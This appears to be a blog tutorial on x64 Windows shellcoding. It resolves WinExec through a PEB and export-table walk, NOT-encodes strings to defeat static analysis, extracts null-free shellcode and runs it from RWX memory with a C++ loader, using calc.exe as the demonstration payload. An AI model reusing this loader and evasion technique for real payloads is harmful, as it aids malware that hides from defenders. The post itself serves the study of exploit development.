---
title:  "x64 Assembly & Shellcoding 101 - Part 4"
header:
  teaser: "/assets/images/asm-part4.png"
categories:
  - Shellcoding
  - Assembly
  - Debugging
tags:
  - Shellcoding
  - x64
  - x64dbg
  - '2024'
  - nasm
  - assembly
  - debugging
---

Hey all!  This will be a shorter post today, so I'll get right to it.  Let's talk shellcode basic encoding functionality built in to x64 assembly instructions.  What we're really talking about here is bitwise operations.  I'm going to use the `NOT` bitwise command to 'encode' all strings within our assembly code. This way, it's harder for static analysis efforts to succeed when searching for strings 😸 I took the liberty of trimming up the code we've been using to execute calc.exe using WinExec.  I'll likely go back and retroactively clean up some code in the previous posts in this series at some point too.  

Here's the portion of code with the `NOT` instruction added after the string.  I have already performed a NOT against the original unencoded string so these `NOT` instructions are to perform decoding operations.
```nasm
mov rax, 0x6F9C9A87BA9196A8   ; WinExec 'encoded'
not rax

mov rax, 0x9A879AD19C939E9C    ; encoded calc.exe ;)
not rax
```
**and the full code below:**
```nasm
;nasm -fwin64 [x64findkernel32.asm]
;ld -m i386pep -o x64findkernel32.exe x64findkernel32.obj
BITS 64
SECTION .text
global main
main:
sub rsp, 0x28
and rsp, 0xFFFFFFFFFFFFFFF0
xor rcx, rcx             ; RCX = 0
mov rax, [gs:rcx + 0x60] ; RAX = PEB
mov rax, [rax + 0x18]    ; RAX = PEB->Ldr
mov rsi,[rax+0x10]       ;PEB.Ldr->InMemOrderModuleList
mov rsi, [rsi]
mov rsi,[rsi]
mov rbx, [rsi+0x30]      ;kernel32.dll base address
mov r8, rbx              ; mov kernel32.dll base addr into r8
;Code for parsing Export Address Table
mov ebx, [rbx+0x3C]           ; Get Kernel32 PE Signature (offset 0x3C) into EBX
add rbx, r8                   ; Add signature offset to kernel32 base. Store in RBX.
xor rcx, rcx                  ; Avoid null bytes from mov edx,[rbx+0x88] by using rcx register to add
add cx, 0x88ff
shr rcx, 0x8                  ; RCX = 0x88ff --> 0x88
mov edx, [rbx+rcx]            ; EDX = [&NewEXEHeader + Offset RVA ExportTable] = RVA ExportTable
add rdx, r8                   ; RDX = kernel32.dll + RVA ExportTable = ExportTable Address
mov r10d, [rdx+0x14]          ; Number of functions
xor r11, r11                  ; Zero R11 before use
mov r11d, [rdx+0x20]          ; AddressOfNames RVA
add r11, r8                   ; AddressOfNames VMA
mov rcx, r10                  ; Set loop counter
mov rax, 0x6F9C9A87BA9196A8   ; WinExec 'encoded'
not rax
shl rax, 0x8
shr rax, 0x8
push rax
mov rax, rsp	
add rsp, 0x8
kernel32findfunction:             ; Loop over Export Address Table to find WinApi names
    jecxz FunctionNameNotFound    ; Loop around this function until we find WinExec
    xor ebx,ebx                   ; Zero EBX for use
    mov ebx, [r11+rcx*4]          ; EBX = RVA for first AddressOfName
    add rbx, r8                   ; RBX = Function name VMA / add kernel32 base address to RVA and get WinApi name
    dec rcx                       ; Decrement our loop by one, this goes from Z to A
    mov r9, qword [rax]                ; R9 = "our API"
    cmp [rbx], r9                      ; Compare all bytes
    jz FunctionNameFound               ; If match, function found
	jnz kernel32findfunction
FunctionNameNotFound:
int3
FunctionNameFound:                ; Get function address from AddressOfFunctions
   inc ecx                        ; increase counter by 1 to account for decrement in loop
   xor r11, r11
   mov r11d, [rdx+0x1c]           ; AddressOfFunctions RVA
   add r11, r8                    ; AddressOfFunctions VMA in R11. Kernel32+RVA for addressoffunctions
   mov r15d, [r11+rcx*4]          ; Get the function RVA.
   add r15, r8                    ; Found the Winexec WinApi and all the while skipping ordinal lookup! w00t!
   xor rax, rax
   push rax
   mov rax, 0x9A879AD19C939E9C    ; encoded calc.exe ;)
   not rax
   push rax
   mov rcx, rsp	                 
   xor rdx, rdx
   inc rdx
   sub rsp, 0x30
   call r15                       ; Call WinExec
```

**Here's a lame trick you can use if you want to decode / encode using `NOT` without having to use assembly.  Use the calculator!  Yes, we're going to use the calculator. I can't seem to get enough of it, it seems. 😸**

![image](https://github.com/user-attachments/assets/0c1103af-9a3d-44d6-99bb-32ec86422c1b)

**This gives us the original, unencoded string:**

![image](https://github.com/user-attachments/assets/8c6c934c-198e-4e88-805b-704b9e78ba96)

**This is nice because you can quickly decode and encode your strings to make sure everything is in working order before committing to your code.  As always, we want to strip this down to just shellcode, make sure it has no NULLs, and execute it!  We'll start with the basic objdump output to work off of:**

```nasm
winexec_nonulls.o:     file format pe-x86-64


Disassembly of section .text:

0000000000000000 <main>:
   0:	48 83 ec 28          	sub    $0x28,%rsp
   4:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
   8:	48 31 c9             	xor    %rcx,%rcx
   b:	65 48 8b 41 60       	mov    %gs:0x60(%rcx),%rax
  10:	48 8b 40 18          	mov    0x18(%rax),%rax
  14:	48 8b 70 10          	mov    0x10(%rax),%rsi
  18:	48 8b 36             	mov    (%rsi),%rsi
  1b:	48 8b 36             	mov    (%rsi),%rsi
  1e:	48 8b 5e 30          	mov    0x30(%rsi),%rbx
  22:	49 89 d8             	mov    %rbx,%r8
  25:	8b 5b 3c             	mov    0x3c(%rbx),%ebx
  28:	4c 01 c3             	add    %r8,%rbx
  2b:	48 31 c9             	xor    %rcx,%rcx
  2e:	66 81 c1 ff 88       	add    $0x88ff,%cx
  33:	48 c1 e9 08          	shr    $0x8,%rcx
  37:	8b 14 0b             	mov    (%rbx,%rcx,1),%edx
  3a:	4c 01 c2             	add    %r8,%rdx
  3d:	44 8b 52 14          	mov    0x14(%rdx),%r10d
  41:	4d 31 db             	xor    %r11,%r11
  44:	44 8b 5a 20          	mov    0x20(%rdx),%r11d
  48:	4d 01 c3             	add    %r8,%r11
  4b:	4c 89 d1             	mov    %r10,%rcx
  4e:	48 b8 a8 96 91 ba 87 	movabs $0x6f9c9a87ba9196a8,%rax
  55:	9a 9c 6f 
  58:	48 f7 d0             	not    %rax
  5b:	48 c1 e0 08          	shl    $0x8,%rax
  5f:	48 c1 e8 08          	shr    $0x8,%rax
  63:	50                   	push   %rax
  64:	48 89 e0             	mov    %rsp,%rax
  67:	48 83 c4 08          	add    $0x8,%rsp

000000000000006b <kernel32findfunction>:
  6b:	67 e3 16             	jecxz  84 <FunctionNameNotFound>
  6e:	31 db                	xor    %ebx,%ebx
  70:	41 8b 1c 8b          	mov    (%r11,%rcx,4),%ebx
  74:	4c 01 c3             	add    %r8,%rbx
  77:	48 ff c9             	dec    %rcx
  7a:	4c 8b 08             	mov    (%rax),%r9
  7d:	4c 39 0b             	cmp    %r9,(%rbx)
  80:	74 03                	je     85 <FunctionNameFound>
  82:	75 e7                	jne    6b <kernel32findfunction>

0000000000000084 <FunctionNameNotFound>:
  84:	cc                   	int3

0000000000000085 <FunctionNameFound>:
  85:	ff c1                	inc    %ecx
  87:	4d 31 db             	xor    %r11,%r11
  8a:	44 8b 5a 1c          	mov    0x1c(%rdx),%r11d
  8e:	4d 01 c3             	add    %r8,%r11
  91:	45 8b 3c 8b          	mov    (%r11,%rcx,4),%r15d
  95:	4d 01 c7             	add    %r8,%r15
  98:	48 31 c0             	xor    %rax,%rax
  9b:	50                   	push   %rax
  9c:	48 b8 9c 9e 93 9c d1 	movabs $0x9a879ad19c939e9c,%rax
  a3:	9a 87 9a 
  a6:	48 f7 d0             	not    %rax
  a9:	50                   	push   %rax
  aa:	48 89 e1             	mov    %rsp,%rcx
  ad:	48 31 d2             	xor    %rdx,%rdx
  b0:	48 ff c2             	inc    %rdx
  b3:	48 83 ec 30          	sub    $0x30,%rsp
  b7:	41 ff d7             	call   *%r15
```

**Let's get only the shellcode:**

**for i in $(objdump -D popcalc.o | grep "^ " | cut -f2); do echo -n "\x$i" ; done**

**Now, pop it into your c++ program and let er rip!**

```c++
#include <windows.h>
#include <iostream>

unsigned char shellcode[] =
"\x48\x83\xec\x28\x48\x83\xe4\xf0\x48\x31\xc9\x65\x48\x8b\x41"
"\x60\x48\x8b\x40\x18\x48\x8b\x70\x10\x48\x8b\x36\x48\x8b\x36"
"\x48\x8b\x5e\x30\x49\x89\xd8\x8b\x5b\x3c\x4c\x01\xc3\x48\x31"
"\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01"
"\xc2\x44\x8b\x52\x14\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3"
"\x4c\x89\xd1\x48\xb8\xa8\x96\x91\xba\x87\x9a\x9c\x6f\x48\xf7"
"\xd0\x48\xc1\xe0\x08\x48\xc1\xe8\x08\x50\x48\x89\xe0\x48\x83"
"\xc4\x08\x67\xe3\x16\x31\xdb\x41\x8b\x1c\x8b\x4c\x01\xc3\x48"
"\xff\xc9\x4c\x8b\x08\x4c\x39\x0b\x74\x03\x75\xe7\xcc\xff\xc1"
"\x4d\x31\xdb\x44\x8b\x5a\x1c\x4d\x01\xc3\x45\x8b\x3c\x8b\x4d"
"\x01\xc7\x48\x31\xc0\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87"
"\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\x31\xd2\x48\xff\xc2\x48"
"\x83\xec\x30\x41\xff\xd7";


int main() {

    void* exec_mem = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (exec_mem == nullptr) {
        std::cerr << "Memory allocation failed\n";
        return -1;
    }
    memcpy(exec_mem, shellcode, sizeof(shellcode));
    auto shellcode_func = reinterpret_cast<void(*)()>(exec_mem);
    shellcode_func();
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    return 0;
}
```
**Forgot to mention, if you compile the exe and search for strings, you won't find winexec or calc, well...you'll see winexec_nonull since that's the filename, but not `WinExec` and `calc.exe`.  In a real world setting I'd change that. 😄  Check it out:**

![image](https://github.com/user-attachments/assets/8fcc5f09-2fd0-4905-9d31-e49b87f8b727)

And that's a wrap folks!  Maybe eventually I'll get around to moving beyond WinExec and onto other apis lol.  It'll happen...but until then take it easy!
